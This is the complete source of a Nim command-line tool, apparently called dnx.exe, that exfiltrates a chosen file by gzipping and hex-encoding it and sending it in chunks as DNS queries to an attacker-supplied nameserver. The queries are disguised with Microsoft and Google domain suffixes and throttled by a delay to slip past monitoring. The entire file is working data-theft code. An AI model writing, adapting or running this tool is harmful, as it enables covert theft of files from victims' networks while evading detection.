import std/[os, strutils, random, sha1]
import pkg/ndns
import zippy
randomize()

proc resolvX(ns: string, data: string): void =
    let client = initDnsClient(ns)
    try:
        discard resolveIpv4(client, data, 1)
    except CatchableError as e:
        #echo "[DEBUG] ", e.msg
        if e.msg.contains("timeout"):
            #echo "[DEBUG] OK ", data
            discard
        else:
            #echo "[DEBUG] ERROR ", data
            quit(e.msg)

proc chuckX(ns: string, data: string, slp: int, domain = ""): void =
    let
        chuckSize = 20 # max 62
        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
    var stringindex: int
    var d = domain
    while stringindex <= data.len-1:
        if domain == "": d = sample(domains)
        let
            query =  data[stringindex .. (if stringindex + chuckSize - 1 > data.len - 1: data.len - 1 else: stringindex + chuckSize - 1)]
            dnsquery = query & d

        resolvX(ns, dnsquery)
        inc(stringindex, chuckSize)
        sleep(slp)

proc dnX(ns: string, file: string, slp: int): void =
    try:
        let
            content = readFile(file)
            gz = compress(content, BestSpeed, dfGzip)
            filename = splitPath(file)
            hash = secureHash(content)
            hex = gz.toHex

        echo "[+] Sending ", file, " [lengh: ", content.len, "][hash: ", hash, "]" 

        chuckX(ns, toHex(filename.tail), slp, ".bb.googleusercontent.com")
        chuckX(ns, hex, slp)
        resolvX(ns, "quit")

        echo "[+] Done!"

    except CatchableError as e:
        echo "[!] Error: ", e.msg

when isMainModule:
    if paramCount() < 3:
        echo "[!] Use: dnx.exe <IP> <File> <Time between requests in ms>"
        echo "[!] e.g: dnx.exe 13.37.13.37 file.pdf 1000"
        quit()
    else:
        dnX(paramStr(1), paramStr(2), parseInt(paramStr(3)))
